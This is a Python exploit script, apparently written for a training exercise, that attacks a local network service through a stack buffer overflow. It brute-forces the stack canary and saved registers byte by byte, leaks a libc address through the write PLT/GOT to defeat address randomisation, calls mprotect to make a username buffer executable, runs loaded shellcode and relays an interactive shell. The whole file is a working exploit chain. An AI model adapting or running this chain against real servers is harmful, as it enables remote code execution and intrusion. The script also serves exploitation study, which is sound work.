#!/usr/bin/python3
import select

import sys
import socket as S
from binascii import hexlify, unhexlify
from struct import pack, unpack

HOST = "127.0.0.1"
PORT = 55555

STACK_LEAK_SIZE = 20

PAGE_SIZE = 0x1000

# mprotect protection flags
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4

PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC

def p32(value):
    return pack("<I", value)

# Offsets that I can get from static binary

# objdump and observe the return address of handle_ping
RETURN_ADDRESS_OFFSET = 0x151a

# objdump -R ./exo2 | grep write 
EXO2_WRITE_GOT = 0x00003fc4

# objdump -d ./exo2 | grep -A3 '<write@plt>'
EXO2_WRITE_PLT = 0x000010c0

# readelf -s ./exo2 | grep -i username
USERNAME_OFFSET = 0x4040

#readelf -s /lib32/libc.so.6 | grep 'write@@'
LIBC_WRITE =  0x00113a70

# readelf -s /lib32/libc.so.6 | grep 'mprotect@@'
LIBC_MPROTECT = 0x0011b130
def oracle(username=b"toto", data=b"", timeout=0.5):
    try:
        s = S.socket(S.AF_INET, S.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))

        s.sendall(pack("<H", 0))
        s.sendall(username)
        s.recv(100)

        s.sendall(pack("<H", 1))
        buf = b"A" * 1024 + data
        s.sendall(pack("<H", len(buf)))

        s.sendall(buf)
        rep = s.recv(len(buf))

        if rep != buf:
            s.close()
            return False

        s.sendall(pack("<H", 2))
        s.recv(100)
        s.close()

        return True

    except Exception:
        return False


def leak_oracle(username=b"toto", data=b"", timeout=0.5):

    try:
        s = S.socket(S.AF_INET, S.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        
        s.sendall(pack("<H", 0))
        s.sendall(username)
        s.recv(100)

        s.sendall(pack("<H", 1))
        buf = b"A" * 1024 + data
        s.sendall(pack("<H", len(buf)))
        s.sendall(buf)
        rep = s.recv(len(buf))
        
        s.close()

        return rep

    except Exception as e:
        print(f"Leak exception: {e}")
        return b""

def send_final_payload(username, payload, timeout=2.0):
    """
    Send the final payload and keep the socket alive for
    interactive communication.
    """

    s = S.socket(S.AF_INET, S.SOCK_STREAM)
    s.settimeout(timeout)

    try:
        s.connect((HOST, PORT))

       
        # put shellcode in username
        s.sendall(pack("<H", 0))
        s.sendall(username)

        hello = s.recv(100)

       
        # Send final overflow with mprotect payload
        s.sendall(pack("<H", 1))
        buf = b"A" * 1024 + payload
        s.sendall(pack("<H", len(buf)))
        s.sendall(buf)

        
        print("Interactive connection starting...\n")
        s.setblocking(False)

        while True:

            readable, _, _ = select.select(
                [s, sys.stdin],
                [],
                [],
            )

            
            # Target -> terminal

            if s in readable:
                data = s.recv(4096)
                if not data:
                    print(
                        "\n Target closed connection."
                    )
                    break

                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

            
            # Terminal -> target
            if sys.stdin in readable:
                command = sys.stdin.buffer.readline()
                if not command:
                    break

                s.sendall(command)

    except KeyboardInterrupt:
        print("\n Interrupted.")

    except Exception as e:
        print(f"\n[!] Connection error")

    finally:
        s.close()


def load_bin(path):

    shellcode = None
    with open(path, "rb") as f:

        shellcode = f.read()

    print(f"Shellcode: {hexlify(shellcode).decode()}")

    return shellcode

def recover_stack_values():
    data = b""

    while len(data) < STACK_LEAK_SIZE:
        print(".", end=" ", flush=True)
        found = False
        for value in range(256):

            candidate = data + bytes([value])
            if oracle(data=candidate):
                data = candidate
                found = True
                break

        if not found:
            raise RuntimeError(f"Could not recover byte {len(data)}")
    print('\n')
    (canary, ebx, esi, ebp, return_addr,fd) = unpack("<IIIIII", data)
    
    return {
        "canary": canary,
        "ebx": ebx,
        "esi": esi,
        "ebp": ebp,
        "return_addr": return_addr,
        "fd": fd,
        "binary_base": None,
        "username_addr": None,
        "shellcode": None,
        "shellcode_path": None,
        "libc_base": None,
    }

def leak_libc(state):

    write_plt = state["binary_base"] + EXO2_WRITE_PLT
    write_got = state["binary_base"] +  EXO2_WRITE_GOT

    payload = pack(
        "<IIIIIIIII",
        state["canary"],
        state["ebx"],
        state["esi"],
        state["ebp"],
        write_plt,
        0,              # fake return address
        4,              # fd
        write_got,      # buffer
        4,              # size
    ) 
    print(
        "payload =",
        hexlify(payload).decode()
    )

    result = leak_oracle(username=b"toto", data=payload)

    if len(result) < 4:
        print(f"Not enough bytes received. {result}")
        return None

    leaked_write = unpack("<I", result[:4])[0]

    print(f"[+] leaked write = {leaked_write:#010x}")

    return leaked_write

def print_state(state):
    for name in (
        "canary",
        "ebx",
        "esi",
        "ebp",
        "return_addr",
        "fd",
        "binary_base",
        "username_addr",
        "libc_base"
    ):
        if state[name]:
            print(
                f"{name:<15} = "
                f"{state[name]:#010x}"
            )

def main():

    # Load shell.bin binary
    code_binary = load_bin("shell.bin")

    # Do bruteforce to get stack values (canary, other saved registors, base address, return address)
    state = recover_stack_values()
    state["shellcode"] = code_binary
    
    # Calculate binary_base address and username address
    state["binary_base"] = state["return_addr"] - RETURN_ADDRESS_OFFSET
    state["username_addr"] = state["binary_base"] + USERNAME_OFFSET
    print_state(state)
    # Send payload to get write function libc address
    leaked_addr = leak_libc(state)

    # Calculate libc_base address
    state["libc_base"] = leaked_addr - LIBC_WRITE

    print_state(state)
    # Calculate mprotect libc_address
    mprotect_address = state["libc_base"] + LIBC_MPROTECT

    # Build the payload to open the shell code
    username = state["shellcode"]
    target_address = state["username_addr"]
    shellcode = state["shellcode"]

    aligned_address = target_address & ~(PAGE_SIZE - 1)
    end_address = target_address + len(shellcode)
    
    aligned_end = (end_address + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE
    length = aligned_end - aligned_address

    arguments = (
        aligned_address,
        length,
        PROT_RWX,   # read write execute permission 0x7
    )

    payload = pack(
        "<IIIIII",

        state["canary"],
        state["ebx"],
        state["esi"],
        state["ebp"],

        mprotect_address,
        target_address,
    )

    for argument in arguments:

        payload += p32(argument)
    # Send the final payload and make it looklike a shell
    send_final_payload(username, payload, timeout=2.0)

if __name__ == "__main__":
    main()


